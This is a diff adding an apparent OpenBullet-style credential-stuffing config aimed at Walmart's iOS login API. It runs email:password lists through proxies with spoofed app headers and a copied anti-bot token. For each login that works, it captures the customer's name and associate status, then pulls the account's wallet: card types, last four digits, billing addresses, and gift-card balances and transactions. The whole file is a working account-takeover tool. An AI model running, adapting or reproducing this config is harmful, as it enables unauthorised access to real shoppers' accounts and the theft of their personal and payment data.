@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "Walmart iOS Api",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T04:21:48.1968807+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.walmart.com/orchestra/account/electrode/api/identity/password" 
+  CONTENT "{\"email\":\"<USER>\",\"authPreference\":\"PASSWORD\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "X-O-Platform-Version: 22.7.0" 
+  HEADER "X-Px-Authorization: 3" 
+  HEADER "User-Agent: WMT1H/22.7 iOS/15.3" 
+  HEADER "X-O-Fuzzy-Install-Date: 1645500000000" 
+  HEADER "X-O-Vertical: GM" 
+  HEADER "X-O-Bu: WALMART" 
+  HEADER "Device_profile_ref_id: 274b3d15b74948f88784d7fd46f3045f" 
+  HEADER "Wm_qos.correlation_id: 2833F600-9028-415E-9896-E171BD11CA8E" 
+  HEADER "X-Wm-Vid: 5A324210-647A-431A-B956-D15E6AF8F7AD" 
+  HEADER "Wm_mp: true" 
+  HEADER "X-O-Tp-Phase: tp5" 
+  HEADER "X-O-Mart: US" 
+  HEADER "X-Enable-Server-Timing: 1" 
+  HEADER "X-O-Platform: ios" 
+  HEADER "Content-Length: 89" 
+  HEADER "X-O-Device: iPhone9,1" 
+  HEADER "X-O-Segment: oaoh" 
+  HEADER "X-Px-Original-Token: 3:81f3910ccb7a65b86d3536fb56e85b2f1d2fd6065062d12ee301a9d430426a49:OM200Y+chCep9tC4qde32hi2cpXaYjdpU/xAoQETKG4Gc5uBAc1mlyMv87eG94HTGQvsK5QhefuIN6BsG2LKuw==:1000:jGZAJrkxtK0qsGrDw3ddLgGUdr+SSmtvXaDINHBAIona6zeODbYUeaz87XvtHKG0F/nrX9N16yfFgnd11Ooz+GHP0l6uwYR6IQtX1L5Wee5VFIHZFy6jx+V9TrWg/mt76zd3yLhrXur7cYdwIa3WkWo/gPacJbToTRVWW9fxL79JMus9MInBfOvibuxCgaURB7S3NiFLEJHrtybI0/VXtA==" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-Latency-Trace: 1" 
+  HEADER "X-Wm-Client-Name: glass" 
+  HEADER "Traceparent: 00-a2e2ab808fbf27a16c1668b1a989d4aa-e63b55b75f6f941a-00" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Wm-Sid: 9E0A64CC-F88F-4F21-B7F1-890ED155A996" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "verificationToken" 
+  KEYCHAIN Failure OR 
+    KEY "user_auth_fail" 
+    KEY "Your password and email do not match" 
+
+PARSE "<SOURCE>" JSON "CID" -> VAR "CID" 
+
+PARSE "<SOURCE>" JSON "verificationToken" -> VAR "VTK" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TK" 
+
+PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "firstName" 
+
+PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "lastName" 
+
+PARSE "<SOURCE>" JSON "customerType" CreateEmpty=FALSE -> CAP "customerType" 
+
+PARSE "<SOURCE>" JSON "hasAssociateDiscountCard" CreateEmpty=FALSE -> CAP "hasAssociateDiscountCard" 
+
+PARSE "<SOURCE>" JSON "isAssociate" CreateEmpty=FALSE -> CAP "isAssociated" 
+
+FUNCTION Length "{\"operationName\":\"GetWallet\",\"query\":\"query GetWallet {  wallet {    __typename    paymentGroups {      __typename      type      message      payments {        __typename        ... on CreditCard {          ...CreditCardFragment        }        ... on EBTCard {          ...EBTCardFragment        }        ... on DsCard {          ...DsCardFragment        }        ... on GiftCard {          ...GiftCardFragment        }      }    }    capOneStatus    topMessagesAndPayments {      __typename      messageType      payment {        __typename        ... on CreditCard {          ...CreditCardFragment        }        ... on EBTCard {          ...EBTCardFragment        }        ... on DsCard {          ...DsCardFragment        }        ... on GiftCard {          ...GiftCardFragment        }      }    }    numberOfExtraMessages    numberOfExtraCards  }}fragment CreditCardFragment on CreditCard {  __typename  id  firstName  lastName  lastFour  isDefault  isEditable  needVerifyCVV  addressLineOne  addressLineTwo  city  state  postalCode  cardType  phone  expiryMonth  expiryYear  displayTypeAndLast4  displayExpireAndName  cardAccountLinked}fragment EBTCardFragment on EBTCard {  __typename  id  lastFour  firstName  lastName}fragment DsCardFragment on DsCard {  __typename  id  lastFour  displayLabel  balance {    __typename    cardBalance    shippingBalance    promotions {      __typename      promotionBalance      promotionCode      promotionDescription    }  }  transactionHistory {    __typename    transactionDate    transactionDisplayDate    transactionAmount    transactionDisplayAmount    cardBalance    transactionType    transactionInfo    transactionInfoDisplayLabel  }  fundingProgram  dsCardType  cardName}fragment GiftCardFragment on GiftCard {  __typename  id  lastFour  displayLabel  balance {    __typename    cardBalance    shippingBalance    promotions {      __typename      promotionBalance      promotionCode      promotionDescription    }  }  transactionHistory {    __typename    transactionDate    transactionDisplayDate    transactionAmount    transactionDisplayAmount    cardBalance    transactionType    transactionInfo    transactionInfoDisplayLabel  }  showAutoProvisionMessage  sender}\",\"variables\":null}" -> VAR "LEN1" 
+
+REQUEST POST "https://www.walmart.com/orchestra/account/graphql" 
+  CONTENT "{\"operationName\":\"GetWallet\",\"query\":\"query GetWallet {  wallet {    __typename    paymentGroups {      __typename      type      message      payments {        __typename        ... on CreditCard {          ...CreditCardFragment        }        ... on EBTCard {          ...EBTCardFragment        }        ... on DsCard {          ...DsCardFragment        }        ... on GiftCard {          ...GiftCardFragment        }      }    }    capOneStatus    topMessagesAndPayments {      __typename      messageType      payment {        __typename        ... on CreditCard {          ...CreditCardFragment        }        ... on EBTCard {          ...EBTCardFragment        }        ... on DsCard {          ...DsCardFragment        }        ... on GiftCard {          ...GiftCardFragment        }      }    }    numberOfExtraMessages    numberOfExtraCards  }}fragment CreditCardFragment on CreditCard {  __typename  id  firstName  lastName  lastFour  isDefault  isEditable  needVerifyCVV  addressLineOne  addressLineTwo  city  state  postalCode  cardType  phone  expiryMonth  expiryYear  displayTypeAndLast4  displayExpireAndName  cardAccountLinked}fragment EBTCardFragment on EBTCard {  __typename  id  lastFour  firstName  lastName}fragment DsCardFragment on DsCard {  __typename  id  lastFour  displayLabel  balance {    __typename    cardBalance    shippingBalance    promotions {      __typename      promotionBalance      promotionCode      promotionDescription    }  }  transactionHistory {    __typename    transactionDate    transactionDisplayDate    transactionAmount    transactionDisplayAmount    cardBalance    transactionType    transactionInfo    transactionInfoDisplayLabel  }  fundingProgram  dsCardType  cardName}fragment GiftCardFragment on GiftCard {  __typename  id  lastFour  displayLabel  balance {    __typename    cardBalance    shippingBalance    promotions {      __typename      promotionBalance      promotionCode      promotionDescription    }  }  transactionHistory {    __typename    transactionDate    transactionDisplayDate    transactionAmount    transactionDisplayAmount    cardBalance    transactionType    transactionInfo    transactionInfoDisplayLabel  }  showAutoProvisionMessage  sender}\",\"variables\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.walmart.com" 
+  HEADER "X-O-Platform-Version: 22.7.0" 
+  HEADER "X-Px-Authorization: 3" 
+  HEADER "User-Agent: WMT1H/22.7 iOS/15.3" 
+  HEADER "X-O-Fuzzy-Install-Date: 1645500000000" 
+  HEADER "X-O-Vertical: GM" 
+  HEADER "X-O-Bu: WALMART" 
+  HEADER "Device_profile_ref_id: 274b3d15b74948f88784d7fd46f3045f" 
+  HEADER "X-Apollo-Operation-Name: GetWallet" 
+  HEADER "Wm_qos.correlation_id: C547784D-D919-407C-AF2C-D2DF655F8EF8" 
+  HEADER "X-Wm-Vid: 5A324210-647A-431A-B956-D15E6AF8F7AD" 
+  HEADER "Wm_mp: true" 
+  HEADER "X-O-Tp-Phase: tp5" 
+  HEADER "X-O-Mart: US" 
+  HEADER "X-Enable-Server-Timing: 1" 
+  HEADER "X-O-Platform: ios" 
+  HEADER "Content-Length: <LEN1>" 
+  HEADER "X-O-Device: iPhone9,1" 
+  HEADER "X-O-Segment: oaoh" 
+  HEADER "X-Px-Original-Token: 3:81f3910ccb7a65b86d3536fb56e85b2f1d2fd6065062d12ee301a9d430426a49:OM200Y+chCep9tC4qde32hi2cpXaYjdpU/xAoQETKG4Gc5uBAc1mlyMv87eG94HTGQvsK5QhefuIN6BsG2LKuw==:1000:jGZAJrkxtK0qsGrDw3ddLgGUdr+SSmtvXaDINHBAIona6zeODbYUeaz87XvtHKG0F/nrX9N16yfFgnd11Ooz+GHP0l6uwYR6IQtX1L5Wee5VFIHZFy6jx+V9TrWg/mt76zd3yLhrXur7cYdwIa3WkWo/gPacJbToTRVWW9fxL79JMus9MInBfOvibuxCgaURB7S3NiFLEJHrtybI0/VXtA==" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-Latency-Trace: 1" 
+  HEADER "X-Wm-Client-Name: glass" 
+  HEADER "Traceparent: 00-a0f4b058169755525af05c1e628c0c22-fa495bd0504ee2dd-00" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Wm-Sid: 9E0A64CC-F88F-4F21-B7F1-890ED155A996" 
+
+PARSE "<SOURCE>" JSON "type" Recursive=TRUE CreateEmpty=FALSE -> CAP "type of payments" 
+
+PARSE "<SOURCE>" LR "\"payments\":[" "]" Recursive=TRUE CreateEmpty=FALSE -> CAP "Payments" 
+
+PARSE "<SOURCE>" JSON "message" Recursive=TRUE CreateEmpty=FALSE -> CAP "Msg" 
+
+PARSE "<SOURCE>" LR "\"numberOfExtraCards\":" "}}}" CreateEmpty=FALSE -> CAP "numberOfExtraCards" 
+
+PARSE "<SOURCE>" LR "\"capOneStatus\":\"" "\"}}}" CreateEmpty=FALSE -> CAP "capOneStatus" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
